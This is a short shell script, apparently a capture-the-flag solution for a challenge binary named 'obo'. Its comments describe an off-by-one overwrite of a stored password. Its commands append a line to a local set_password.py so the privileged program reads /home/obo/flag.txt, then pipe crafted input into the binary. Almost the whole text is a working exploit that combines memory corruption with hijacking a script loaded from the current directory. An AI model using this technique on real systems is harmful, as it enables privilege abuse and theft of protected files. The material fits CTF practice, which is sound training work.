# tons of off-by-1 mistakes in obo.c
# if you have 'g', you will write 0x00000001 to digits[16], which will write over the original password
# note that digits[] has ints and password[] has chars
# lastly, set_password.py is taken from the current dir
cd
echo "print open('/home/obo/flag.txt').read()" >> set_password.py
printf "0123456789abcdefg\n\x01" | /home/obo/obo
